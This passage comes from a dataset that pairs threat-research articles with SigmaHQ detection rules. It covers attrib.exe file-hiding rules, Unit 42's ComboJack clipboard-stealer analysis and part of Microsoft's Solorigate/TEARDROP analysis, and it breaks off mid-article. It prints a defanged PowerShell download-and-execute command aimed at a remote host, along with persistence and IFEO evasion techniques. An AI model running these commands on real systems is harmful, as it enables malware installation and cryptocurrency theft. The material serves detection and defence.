d3a5313a0070b8400b0d661f2515a0eb83e4e6110b98e9ffb6618e457bf52714\n- 15e6984beea04bf2f26fbbe1e490c59d1f51ba7ad0dce3ac76cea21579ca694b\n- 325fd50143d6d975d9db18cf9a069c9107c3bfcad5a07653d53c0fc315ee27ab\n\n**Payload:**\n\n- bd1b56b6814aae369b0593dfe71450e1b45cb288f752faa2622d1b189bc6b2d6\n- 228e8b728f7b714934f5ecfa6fd5de256d1d24f634a63f2fc4663c7cfb3b9d65\n- 05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136\n- d92b4c622d3524f6d5ce8fe53d802c6a0c51fd1f56ac2b554daac24d7b4fb8ef\n- 4d96d8cfefd9cc3f86bd3ab7f054f0b0acef726a4c349359bf44d22952b4744d\n- 85c27addbf3a7234ac1e2922002fdef216994708bdda28f2ad6d3a7a1b32934e\n- ea5eb17c32767486c1b3a8ee7a8eacefab125c93414cdea97348c2ee96752f7e\n- a6807cf5ed53b34cc9513defcde56c8a956c3d574ee9f300b3a763a7c8287081\n- 8d8f497313ed797090ef552d44198f8c21f0a6ed261b30902d4d37478cd2efeb\n- 47f14c24212c32e686f0b9162530c4b966c9cff907e1920c096ad81d078f20cd\n- 05cbc6b1e98bc6f8935f95454ba214cccaf3a36c497126512669daba59a407a0\n- 8a6f75a4a58bdafed085fd640681a4c94eee54f1bfb6e5eb6dcf8eb7524d2a2e\n- 2ee9a1c554a774925f83428a0822b901d7b3ed81c247cb0d038ecc188d9f9149\n- d0f6dcdb4f749490a7ef678e9006474c885fbb3d8e396a5c8f2150441bb34782\n- a10a5666ce31c7a3de760f33d93bd924354e7bac1f07bde9e3ac3da8e250eb6d\n- 98e896586ea71f80a2b0024ec86133bfa5163f01f4faa1b1f380f0a2ea128c2f\n- f9bff08960484d5c97f075090b9843dc1d54839a4dabc514e8f97f809e1ceaf5\n- c1cc9448ee5684698f7891911821a9eb86f56be8852adef613b2fab4636e7b36\n- ece82af6fa1e94904d62e86fe86810fe85b058e56a311ca24ac7667409cff8c0",
    "sigma_rule": {
      "title": "Hiding Files with Attrib.exe",
      "id": "4281cb20-2994-4580-aa63-c8b86d019934",
      "status": "test",
      "description": "Detects usage of attrib.exe to hide files from users.",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
        "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter"
      ],
      "author": "Sami Ruohonen",
      "date": "2019-01-16",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +h "
        },
        "filter_main_msiexec": {
          "CommandLine|contains": "\\desktop.ini "
        },
        "filter_optional_intel": {
          "ParentImage|endswith": "\\cmd.exe",
          "CommandLine": "+R +H +S +A \\\\\\*.cui",
          "ParentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\\\*.bat"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)",
        "Msiexec.exe hiding desktop.ini"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_hiding_files.yml",
    "id": "60"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
    "markdown": "# Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency\n\n**Malware**\n**Related Products**: [Advanced WildFire](https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/)\n**Published:** March 5, 2018\n**Categories:**\n- Cybercrime\n- Malware\n- Threat Research\n**Tags:**\n- ComboJack\n- Cryptocurrency\n- Cryptoshuffler\n- CVE-2017-8579\n\n---\n\n## Summary\n\nUnit 42 researchers have discovered a new currency stealer targeting cryptocurrencies and online wallets. \"ComboJack\" replaces clipboard addresses with an attacker-controlled address, sending funds to the attacker's wallet. This technique relies on victims not checking the destination wallet before finalizing a transaction. In 2017, CryptoShuffler was the first malware to use this tactic. ComboJack targets a range of cryptocurrencies and digital currencies such as WebMoney and Yandex Money.\n\n## Details\n\nOn February 25, 2018, Unit 42 and Proofpoint researchers observed a malspam campaign targeting Japanese and American users. The campaign claimed a passport was lost, and the attached PDF contained a scanned copy of the document.\n\n\n\n*Image 1. Example malspam received by users.*\n\nUsers opening this PDF would find a single line of text referring to an embedded doc file.\n\n```image\nAlt: Combojack_2\nDescription: The image displays a prompt from a PDF document indicating that it embeds a file named 'Achi1.doc.' The message warns the user that the embedded file may contain harmful programs, macros, or viruses and asks whether they would like to open the file. The options provided include 'Open this file,' 'Always allow opening files of this type,' and 'Never allow opening files of this type.' This prompt illustrates a potential security risk associated with opening embedded files in documents, aligning with the context of malware distribution discussed in the provided text.\nTranscription: |\n  This PDF document embeds file Achi1.doc\n  \n  Open File\n  \n  The file 'Achi1.doc' may contain programs, macros, or viruses that could potentially harm your computer. Open the file only if you are sure it is safe. Would you like to:\n  \n  ( ) Open this file\n  ( ) Always allow opening files of this type\n  ( ) Never allow opening files of this type\n  \n  [ OK ] [ Cancel ]\n```\n\n*Figure 1. Prompt displayed to the victim when opening the embedded RTF file.*\n\nThe PDF contained an embedded RTF file with a remote object that attacks CVE-2017-8579, as discussed in this FireEye report. The remote object is an HTA file located at `hXXps://a.doko[.]moe/tnejln`, containing encoded PowerShell commands.\n\n```image\nAlt: ComboJackImage2\nDescription: The image depicts a snippet of obfuscated JavaScript code, likely used in a malicious context. The code includes references to creating a COM object, reversing character strings, and executing PowerShell commands. It suggests that this code is part of the ComboJack malware, which alters clipboards to steal cryptocurrency by executing a downloaded executable file.\nTranscription: |\n  html\n  <!DOCTYPE html>\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE8\" >\n  <html>\n  <body>\n  <ScRiPt LANgUAgE=\"vbscriPtscript>\n```\n\n*Image 2. Contents of the HTA file retrieved from hXXps://a.doko[.]moe/tnejln.*\n\nDecoding the HTA file yields the following PowerShell command, which downloads and executes a file:\n\n```\nwscript.shell %systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe (new-object system.net.webclient).downloadfile(hXXp://masolo[.]win/protect/achi.exe $env:appdata\\bstest.exe) ; start $env:appdata\\bstest.exe\n```\n\nThe full flow of execution can be visualized as follows:\n\n```image\nAlt: Combojack_3\nDescription: The image illustrates the flow of execution in a malware attack involving ComboJack. It depicts a series of steps that a victim goes through: receiving a malicious email, opening a PDF attachment, loading an embedded RTF file, which then exploits a vulnerability to run a PowerShell script that downloads and executes the ComboJack malware on the victim's machine. Each step is represented with graphic icons indicating the actions taken.\nTranscription: The image illustrates the flow of execution in a malware attack involving ComboJack. It depicts a series of steps that a victim goes through: receiving a malicious email, opening a PDF attachment, loading an embedded RTF file, which then exploits a vulnerability to run a PowerShell script that downloads and executes the ComboJack malware on the victim's machine. Each step is represented with graphic icons indicating the actions taken.\n```\n\n*Figure 2. Flow of execution leading to ComboJack being installed on the victim.*\n\n---\n\n## ComboJack\n\nThe following files were used for this analysis:\n\n| **File**      | **SHA256**                                                       |\n| ------------- | ---------------------------------------------------------------- |\n| Initial File  | 9613aefc12880528040812b0ce9d3827d1c25fe66f8598eaef82c169e8ed02da |\n| Second Stage  | cab010b59cf9d649106477df012ca49f939aa537910b56bfadbe1381b0484d88 |\n| Final Payload | 05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136 |\n\nThe initially downloaded file is a self-extracting executable (SFX) with embedded commands for extracting the second stage. The second stage is a password-protected SFX, but the password is supplied by the first stage. The “setup.txt” from the first stage contains the following:\n\n```image\nAlt: Combojack_4\nDescription: The image contains a screenshot of a configuration file, likely related to the ComboJack malware analysis. It shows various lines of code indicating settings for executable files, such as paths, silent installation options, overwrite permissions, and update flags. The highlighted setups include 'NVDisplay.Container.exe' and another executable with a unique identifier. This file is part of the malware's setup process, detailing how it operates silently on the infected machine.\nTranscription: |\n  Path=%Temp%\n  Setup=NVDisplay.Container.exe\n  Silent=1\n  Overwrite=1\n  Update=U\n  Path=%Temp%\n  Setup=RyODwdjId0q7.exe -pDilouooYyyfZ\n  Silent=1\n  Overwrite=1\n  Update=U\n```\n\n*Image 3. Contents of setup.txt embedded in the first SFX layer of the payload.*\n\nOnce ComboJack is extracted, it copies itself to:\n\n```\nC:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\n```\n\nIt then uses `attrib.exe` to set hidden and system attributes to itself, hiding the file from the user and allowing it to execute with SYSTEM-level privileges:\n\n```\ncmd /k attrib +s +h \"C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\"\n```\n\nFinally, the payload sets the following registry key to ensure persistence:\n\n```\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\NVIDIA – C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\n```\n\nComboJack enters an infinite loop, checking the clipboard every half second for wallet information. If a wallet of interest is found, ComboJack replaces it with a hardcoded wallet address. The replacement criteria are as follows:\n\n| **Criteria**                        | **Replaces with**                                  | **Wallet Type**           |\n| ----------------------------------- | -------------------------------------------------- | ------------------------- |\n| Length of 42 and starts with ‘0’    | 0xE44598AB74425450692F7b3a9f898119968da8Ad         | Ethereum                  |\n| Length of 106 and starts with ‘4’   | 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBE | Monero (incorrect length) |\n| Length of 34 and starts with ‘1’    | 1LGskAycxvcgh6iAoigcvbwTtFjSfdod2x                 | Bitcoin                   |\n| Length of 34 and starts with ‘L’    | LYB56d6TeMg6VmahcgfTZSALAQRcNRQUV                  | Litecoin                  |\n| Length of 11 and starts with ‘8’    | 79965017478                                        | Qiwi                      |\n| Length of 13 and starts with ‘R’    | R064565691369                                      | WebMoney (Rubles)         |\n| Length of 13 and starts with ‘Z’    | Z152913748562                                      | WebMoney (USD)            |\n| Length of 13 and starts with ‘E’    | 88888888888888888888888888888888888888888888888888 | Unknown                   |\n| Length of 15 and starts with ‘4100’ | 410014474125403                                    | Yandex Money              |\n\n*Table 1. Replacement address lookup table hardcoded into ComboJack.*\n\n---\n\n## Conclusion\n\nWith the rise of Cryptomining malware, some actors are taking a different route to acquiring web-based currency. ComboJack targets multiple cryptocurrencies and web-based wallets, hedging bets on which currency will boom. As cryptocurrency prices rise, more malware targeting cryptocurrencies is expected.\n\nPalo Alto Networks WildFire customers are protected from this threat through the following:\n\n- ComboJack malware is identified as malicious and blocked via the Traps and WildFire products.\n- Customers can monitor and track ComboJack through the AutoFocus tag.\n\n---\n\n## IOCs\n\n**Lure PDFs:**\n\n- dd8ba88df50de86e7bb9b6343313e48e1e3b8d1a84ffca0a06a203a2f027cfdc\n- d3a5313a0070b8400b0d661f2515a0eb83e4e6110b98e9ffb6618e457bf52714\n- 15e6984beea04bf2f26fbbe1e490c59d1f51ba7ad0dce3ac76cea21579ca694b\n- 325fd50143d6d975d9db18cf9a069c9107c3bfcad5a07653d53c0fc315ee27ab\n\n**Payload:**\n\n- bd1b56b6814aae369b0593dfe71450e1b45cb288f752faa2622d1b189bc6b2d6\n- 228e8b728f7b714934f5ecfa6fd5de256d1d24f634a63f2fc4663c7cfb3b9d65\n- 05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136\n- d92b4c622d3524f6d5ce8fe53d802c6a0c51fd1f56ac2b554daac24d7b4fb8ef\n- 4d96d8cfefd9cc3f86bd3ab7f054f0b0acef726a4c349359bf44d22952b4744d\n- 85c27addbf3a7234ac1e2922002fdef216994708bdda28f2ad6d3a7a1b32934e\n- ea5eb17c32767486c1b3a8ee7a8eacefab125c93414cdea97348c2ee96752f7e\n- a6807cf5ed53b34cc9513defcde56c8a956c3d574ee9f300b3a763a7c8287081\n- 8d8f497313ed797090ef552d44198f8c21f0a6ed261b30902d4d37478cd2efeb\n- 47f14c24212c32e686f0b9162530c4b966c9cff907e1920c096ad81d078f20cd\n- 05cbc6b1e98bc6f8935f95454ba214cccaf3a36c497126512669daba59a407a0\n- 8a6f75a4a58bdafed085fd640681a4c94eee54f1bfb6e5eb6dcf8eb7524d2a2e\n- 2ee9a1c554a774925f83428a0822b901d7b3ed81c247cb0d038ecc188d9f9149\n- d0f6dcdb4f749490a7ef678e9006474c885fbb3d8e396a5c8f2150441bb34782\n- a10a5666ce31c7a3de760f33d93bd924354e7bac1f07bde9e3ac3da8e250eb6d\n- 98e896586ea71f80a2b0024ec86133bfa5163f01f4faa1b1f380f0a2ea128c2f\n- f9bff08960484d5c97f075090b9843dc1d54839a4dabc514e8f97f809e1ceaf5\n- c1cc9448ee5684698f7891911821a9eb86f56be8852adef613b2fab4636e7b36\n- ece82af6fa1e94904d62e86fe86810fe85b058e56a311ca24ac7667409cff8c0",
    "sigma_rule": {
      "title": "Set Suspicious Files as System Files Using Attrib.EXE",
      "id": "efec536f-72e8-4656-8960-5e85d091345b",
      "related": [
        {
          "id": "bb19e94c-59ae-4c15-8c12-c563d23fe52b",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs\n",
      "references": [
        "https://any.run/report/f7b10988747352a0cd43b80ffc8ac821279ca05f695024d0e5009b6e71f758fa/c28cabc8-a19f-40f3-a78b-cae506a5c0d4/",
        "https://any.run/report/fdf628273629e05facb3b6b55ccf60ecb25eb736c1f22c9500d7ffd86ca6cf85/cfc8870b-ccd7-4210-88cf-a8087476a6d0/",
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +s"
        },
        "selection_paths": {
          "CommandLine|contains": [
            " %",
            "\\Users\\Public\\",
            "\\AppData\\Local\\",
            "\\ProgramData\\",
            "\\Downloads\\",
            "\\Windows\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "filter_optional_installer": {
          "CommandLine|contains|all": [
            "\\Windows\\TEMP\\",
            ".exe"
          ]
        },
        "condition": "all of selection* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_system_susp_paths.yml",
    "id": "64"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/",
    "markdown": "# Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop\n\n**Published**: January 20, 2021\n\n---\n\n> **UPDATE:** Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that compromised the supply chain of SolarWinds and impacted multiple other organizations. Microsoft previously used ‘Solorigate’ as the primary designation for the actor, but moving forward, we want to place appropriate focus on the actors behind the sophisticated attacks, rather than one of the examples of malware used by the actors. Microsoft Threat Intelligence Center (MSTIC) has named the actor behind the attack against SolarWinds, the SUNBURST backdoor, TEARDROP malware, and related components as NOBELIUM. As we release new content and analysis, we will use NOBELIUM to refer to the actor and the campaign of attacks.\n\nMore than a month into the discovery of Solorigate, investigations continue to unearth new details that prove it is one of the most sophisticated and protracted intrusion attacks of the decade. Our continued analysis of threat data shows that the attackers behind Solorigate are skilled campaign operators who carefully planned and executed the attack, remaining elusive while maintaining persistence. These attackers appear to be knowledgeable about operations security and performing malicious activity with minimal footprint. In this blog, we’ll share new information to help better understand how the attack transpired. Our goal is to continue empowering the defender community by helping to increase their ability to hunt for the earliest artifacts of compromise and protect their networks from this threat.\n\nWe have published our in-depth analysis of the Solorigate backdoor malware (also referred to as SUNBURST by FireEye), the compromised DLL that was deployed on networks as part of SolarWinds products, that allowed attackers to gain backdoor access to affected devices. We have also detailed the hands-on-keyboard techniques that attackers employed on compromised endpoints using a powerful second-stage payload, one of several custom Cobalt Strike loaders, including the loader dubbed TEARDROP by FireEye and a variant named Raindrop by Symantec.\n\n## The missing link: From the Solorigate backdoor to Cobalt Strike implants\n\nAn attack timeline that SolarWinds disclosed in a recent blog showed that a fully functional Solorigate DLL backdoor was compiled at the end of February 2020 and distributed to systems sometime in late March. The same blog also said that the attackers removed the Solorigate backdoor code from SolarWinds’ build environment in June 2020.\n\nConsidering this timeline and the fact that the Solorigate backdoor was designed to stay dormant for at least two weeks, we approximate that the attackers spent a month or so in selecting victims and preparing unique Cobalt Strike implants as well as command-and-control (C2) infrastructure. This approximation means that real hands-on-keyboard activity most likely started as early as May.\n\n```image\nAlt: Timeline of Solorigate attacks\nDescription: The image is a timeline diagram detailing the sequence of events related to the Solorigate cyber attacks. It highlights key dates and activities such as the attackers starting to access SolarWinds in September 2019, the compilation and deployment of the Solorigate backdoor in February 2020, the distribution of the SUNBURST malware in March, and the activation of the TEARDROP implant in May 2020. Each event is annotated with specific actions taken by the attackers and is visually represented along a horizontal timeline that spans from September 2019 to January 2021.\nTranscription: |\n  Timeline of Solorigate attacks\n  \n  - Sep 4 – Attackers start accessing SolarWinds*\n  - Sep 12 – Attackers start injecting test code*\n  - Nov 4 – Attackers stop injecting test code*\n  - Feb 20 – Solorigate backdoor is compiled and deployed*\n  - March – Estimated start of distribution of Solorigate backdoor\n    - Distribution of SUNBURST and target-profiling**\n  - May – Estimated start of actual hands-on-keyboard attacks\n    - Activation of TEARDROP**\n    - Continued hands-on-keyboard activity**\n  - Jun 4 – Attackers remove malware from SolarWinds build environment*\n  - Dec 12 – Solorigate supply chain attack disclosed\n  \n  * Info disclosed by SolarWinds\n  ** Estimated timeline of activity based on forensic analysis\n```\n\n*Figure 1. Timeline of the protracted Solorigate attack*\n\nBut how exactly does this jump from the Solorigate backdoor (SUNBURST) to the Cobalt Strike loader (TEARDROP, Raindrop, and others) happen? What code gets triggered, and what indicators should defenders look for?\n\n```image\nAlt: Solorigate attack chain\nDescription: The image is a diagram illustrating the attack chain of the Solorigate operation, detailing the transition from the initial Solorigate backdoor (represented by 'solarwinds.businesslayerhost.exe') to the subsequent use of Cobalt Strike for remote access. It shows various steps such as activation of the backdoor, environment inspection, gathering of information, connection to command-and-control (C2) servers, and the eventual remote control of the system via the Cobalt Strike beacon. The flow includes visual indicators of the attacker's actions and the sequence of events leading to a hands-on-keyboard attack.\nTranscription: |\n  Attacker\n     |\n     |------------------- Initial C2\n     |------------------- Second C2\n     |------------------- Cobalt Strike C2\n     |\n  ON-PREMISES\n     |\n  DEVICE\n     |\n     |-- solarwinds.businesslayerhost.exe\n     |\n     |-- SolarWinds.Orion.Core.BusinessLayer.dll (compromised)\n     |\n     |-- Backdoor activates\n     |\n     |-- Backdoor inspects environment\n     |\n     |-- Backdoor gathers info\n     |\n     |-- Backdoor connects to initial C2, sends gathered info\n     |\n     |-- Cobalt Strike downloaded from a second C2\n     |\n     |-- Remote control via Cobalt Strike Beacon\n     |\n     |-- Hands-on-keyboard attack on premises\n```\n\n*Figure 2. Diagram of transition between Stage 1 and Stage 2 of the Solorigate attack*\n\nSophisticated attackers like those behind Solorigate have a goal of expansion and stealthy persistence to maximize the amount of time they can remain undetected and collect valuable information. It’s important for organizations to be able to look at forensic data across their entire environment to see how far attackers have traversed the network and how long they were there, in order to have confidence that attacks have been properly remediated from the environment. The best way to do that is with an extended detection and response (XDR) solution that enables organizations to replay past events to look for activity that might reveal the presence of an attacker on the network. Affected organizations without an XDR solution like Microsoft 365 Defender in place will have a difficult job of performing incident response.\n\nWhat we found from our hunting exercise across Microsoft 365 Defender data further confirms the high level of skill of the attackers and the painstaking planning of every detail to avoid discovery. To illustrate, the following diagram shows the entry vector attack chain at a glance:\n\n```image\nAlt: Transition from Solorigate to Cobalt Strike\nDescription: The image is a detailed diagram illustrating the transition from the Solorigate backdoor to the Cobalt Strike implants in a cyber attack chain. It visually represents the steps involved in the attack, organized into four categories: Network, File, Registry, and Process. Each category outlines specific actions, such as DNS connections, file drops for the VBScript and DLLs, registry modifications for persistence, and the execution of processes that trigger further malicious activities. The diagram also highlights the intended stealth and complexity of the attack strategy employed by the attackers, showcasing their methods for evading detection.\nTranscription: |\n  Network | File | Registry | Process\n  \n  SolarWinds.BusinessLayerHost.exe\n  - SolarWinds.Orion.Core.BusinessLayer.dll\n    - Solorigate backdoor\n      - connect → DNS: [DGA].avsvmcloud.com (1)\n  \n  dllhost.exe (random legit execution)\n  \n  wscript.exe\n  - C:\\Windows\\[folder1]\\trigger\\.vbs\n    - drop →\n      - C:\\Windows\\[folder1]\\trigger\\.vbs\n      - C:\\Windows\\[folder2]\\teardrop\\.dll (2)\n    - reg create →  \n      - `HKLM\\..\\IFEO\\dllhost.exe\\Debugger = \"wscript.exe C:\\Windows\\[folder1]\\trigger\\.vbs\"` (3)\n    - proc create →\n      - wscript.exe C:\\Windows\\[folder1]\\trigger\\.vbs (4)\n  \n  rundll32.exe\n  - C:\\Windows\\[folder2]\\custom loader\\.dll\n    - proc create →\n      - Rundll32.exe C:\\Windows\\[folder2]\\[teardrop].dll, Tk_[fakeexport] (5)\n    - reg delete →\n      - `HKLM\\..\\IFEO\\dllhost.exe\\Debugger` (6)\n    - connect →\n      - HTTPS: [C2 domain] (7)\n```\n\n*Figure 3. Transition from Solorigate backdoor to Cobalt Strike*\n\nWe spent countless hours investigating Microsoft Defender telemetry and other signals from potential patient-zero machines running the backdoored version of SolarWinds DLL. Most of these machines communicated with the initial randomly generated DNS domain *.avsvmcloud.com* but without significant activity (step #1). However, we saw limited cases in May and June where the initial DNS network communication was closely followed by network activity on port 443 (HTTPS) to other legit-looking domains (step #7). On these handful of machines, we performed deep inspection of telemetry.\n\nWe know that the Solorigate backdoor only activates for certain victim profiles, and when this happens, the executing process (usually *SolarWinds.BusinessLayerHost.exe*) creates two files on disk (step #2):\n\n- A VBScript, typically named after existing services or folders to blend into legitimate activities on the machine\n- A second-stage DLL implant, a custom Cobalt Strike loader, typically compiled uniquely per machine and written into a legitimate-looking subfolder in *%WinDir%* (e.g., *C:\\Windows*)\n\nAt this point the attackers are ready to activate the Cobalt Strike implant. However, the attackers apparently deem the powerful SolarWinds backdoor too valuable to lose in case of discovery, so they tried to separate the Cobalt Strike loader’s execution from the SolarWinds process as much as possible. Their hope is that, even if they lose the Cobalt Strike implant due to detection, the compromised SolarWinds binary and the supply chain attack that preceded it are not exposed.\n\nThe attackers achieved this by having the SolarWinds process create an Image File Execution Options (IFEO) Debugger registry value for the process *dllhost.exe* (step #3). This is a known MITRE ATT&CK technique used for persistence, but it could also be abused to trigger execution of malicious code when a certain process is launched. Once the registry value is created, the attackers simply wait for the occasional execution of *dllhost.exe*, which might happen naturally on a system. This execution triggers a process launch of *wscript.exe* configured to run the VBScript file dropped in step #4.\n\nThe VBScript in turn runs *rundll32.exe*, activating the Cobalt Strike DLL (step #5) using a clean parent/child process tree completely disconnected from the SolarWinds process. Finally, the VBScript removes the previously created IFEO value to clean up any traces of execution (step #6) and also deletes the following registry keys related to HTTP proxy:\n\n- *HKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoDetect*\n- *HKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoConfigURL*\n\n## Analyzing the custom Cobalt Strike loaders\n\nIn our investigation, we identified several second-stage malware, including TEARDROP, Raindrop, and other custom loaders for the Cobalt Strike beacon. During the lateral movement phase, the custom loader DLLs are dropped mostly in existing Windows sub-directories. Below are some example paths (additional paths are listed at the end of this blog):\n\n- *C:\\Windows\\ELAMBKUP\\WdBoot.dll*\n- *C:\\Windows\\Registration\\crmlog.dll*\n- *C:\\Windows\\SKB\\LangModel.dll*\n- *C:\\Windows\\AppPatch\\AcWin.dll*\n- *C:\\Windows\\PrintDialog\\appxsig.dll*\n- *C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll*\n- *C:\\Windows\\Panther\\MainQueueOnline.dll*\n- *C:\\Windows\\assembly\\GAC_64\\MSBuild\\3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll*\n- *C:\\Windows\\LiveKernelReports\\KerRep.dll*\n\nThe files have names that resemble legitimate Windows file and directory names, once again demonstrating how the attackers attempted to blend in the environment and hide in plain sight:\n\n| Legitimate Windows file/directory                                           | Malicious custom loader                                                     |\n| --------------------------------------------------------------------------- | --------------------------------------------------------------------------- |\n| *C:\\Windows\\ELAMBKUP\\WdBoot.sys*                                            | *C:\\Windows\\ELAMBKUP\\WdBoot.dll*                                            |\n| *C:\\Windows\\Registration\\CRMLog*                                            | *C:\\Windows\\Registration\\crmlog.dll*                                        |\n| *C:\\Windows\\SKB\\LanguageModels*                                             | *C:\\Windows\\SKB\\LangModel.dll*                                              |\n| *C:\\Windows\\AppPatch\\AcRes.dll*                                             | *C:\\Windows\\AppPatch\\AcWin.dll*                                             |\n| *C:\\Windows\\PrintDialog\\appxsignature.p7x*                                  | *C:\\Windows\\PrintDialog\\appxsig.dll*                                        |\n| *C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp10.dll*                         | *C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll*                         |\n| *C:\\Windows\\Panther\\MainQueueOnline0.que*                                   | *C:\\Windows\\Panther\\MainQueueOnline.dll*                                    |\n| *C:\\Windows\\assembly\\GAC_64\\MSBuild\\ 3.5.0.0__b03f5f7f11d50a3a\\MSBuild.exe* | *C:\\Windows\\assembly\\GAC_64\\MSBuild\\ 3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll* |\n\nTEARDROP, Raindrop, and the other custom Cobalt Strike Beacon loaders observed during the Solorigate investigation are likely generated using custom Artifact Kit templates. Each custom loader loads either a Beacon Reflective Loader or a preliminary loader that subsequently loads the Beacon Reflective Loader. Reflective DLL loading is a technique for loading a DLL into a process memory without using the Windows loader.\n\n```image\nAlt: Structure of the two variants of Cobalt Strike Beacon loaders\nDescription: The image displays a diagram illustrating the structure of two variants of Cobalt Strike Beacon loaders used in the Solorigate attacks. On the left, it showcases the TEARDROP variant, which includes a preliminary loader (Artifact Kit) containing a Cobalt Strike Reflective Loader and a 'Beacon' icon, emphasizing its function. On the right, the Raindrop variant is presented, showing its CODE and DATA sections, both containing a Cobalt Strike Reflective Loader and a 'Beacon' icon. The diagram is visually structured to convey technical details about the malware's composition.\nTranscription: |\n  Custom loader DLL (TEARDROP)\n  --------------------------------\n  Preliminary loader\n  (Artifact Kit)\n  --------------------------------\n  Cobalt Strike Reflective Loader\n  --------------------------------\n  Beacon\n  \n  Variant 1: TEARDROP\n  \n  Type A DLL\n  -------------------------------\n  CODE Section\n  -------------------------------\n  DATA Section\n  -------------------------------\n  Cobalt Strike Reflective Loader\n  --------------------------------\n  Beacon\n  \n  Variant 2: Other custom Cobalt Strike Beacon loaders\n  \n  Type B DLL (Raindrop)\n  -------------------------------\n  CODE Section\n  -------------------------------\n  DATA Section\n  -------------------------------\n  Cobalt Strike Reflective Loader\n  --------------------------------\n  Beacon\n```\n\n*Figure 4. Structure of the two variants of Cobalt Strike Beacon loaders observed in Solorigate attacks*\n\nIn the succeeding sections, we discuss the Cobalt Strike Beacon variants we observed in our Solorigate investigations.\n\n### Variant 1: TEARDROP\n\nTo date, Microsoft has analyzed two versions of the second-stage custom Cobalt Strike Beacon loader known as TEARDROP (detected as *Trojan:Win64/Solorigate.SA!dha* by Microsoft):\n\n- A service DLL (loaded by *svchost.exe*) with a *ServiceMain* function typically named *NetSetupServiceMain*\n- A standard non-Service DLL loaded by *rundll32.exe*\n\nIrrespective of the loading methodology, both versions have an export function that contains the trigger for the malicious code. The malicious code is executed in a new thread created by the export function. Upon execution, the malicious code attempts to open a file with a .jpg extension (e.g., *festive_computer.jpg*, *upbeat_anxiety.jpg*, *gracious_truth.jpg*, and *confident_promotion.jpg*). Further analysis is required to determine the purpose and role of the .jpg file referenced by each sample. The code also checks the presence of the Windows registry key *SOFTWARE\\Microsoft\\CTF* and terminates if the registry key is present or accessible. Next, the code proceeds to decode and subsequently execute an embedded custom preliminary loader.\n\n```image\nAlt: Structure of Variant 1 custom loader\nDescription: The image is a diagram illustrating the structure of the custom loader DLL known as TEARDROP. It is segmented into three layers: the outer layer labeled 'Custom loader DLL (TEARDROP)', the middle layer labeled 'Preliminary loader (Artifact Kit)', and the innermost layer labeled 'Cobalt Strike Reflective Loader', which contains an icon representing 'Beacon'. This visual representation clarifies the hierarchical relationship between the components involved in the TEARDROP custom loader's architecture.\nTranscription: |\n  Custom loader DLL (TEARDROP)\n  └── Preliminary loader (Artifact Kit)\n      └── Cobalt Strike Reflective Loader\n          └── Beacon\n```\n\n*Figure 5. Structure of Variant 1 custom loader*\n\nThe preliminary 